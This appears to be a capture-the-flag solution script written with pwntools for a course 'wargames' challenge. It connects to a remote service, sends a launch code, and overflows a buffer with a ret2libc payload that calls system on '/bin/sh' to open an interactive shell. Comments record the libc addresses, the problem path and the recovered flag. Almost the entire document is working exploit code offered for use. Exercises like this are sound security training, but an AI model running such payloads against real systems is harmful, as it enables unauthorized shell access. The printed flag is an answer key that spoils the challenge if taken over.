# ELF Required Library : libc-2.23.so
from pwn import *

context.clear(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

r = remote("cs4401shell.walls.ninja",31375)

# r.recvall()
# r.interactive()
enter = b'\n\nCPE 1704 TKS\nY'
sys_addr = p64(0x7ffff7a523a0)
offset = 519
argOffset = 519 -8
arg = b'/bin/sh '
shelly = p64(0x7ffff7b99e57)
payload = flat({0:enter,argOffset:shelly,offset:sys_addr})
r.sendline(payload)
r.interactive()


#Launch Code : CPE 1704 TKS

#System Addr: 0x7ffff7a523a0

#Exit Addr :  0x7ffff7a47040

#location /problems/wargames_0_8d68d803786f4b61ab7ae0e3cb9ed7d2

#FLAG: 204bbb24abb2cbd2579746728a6e0b75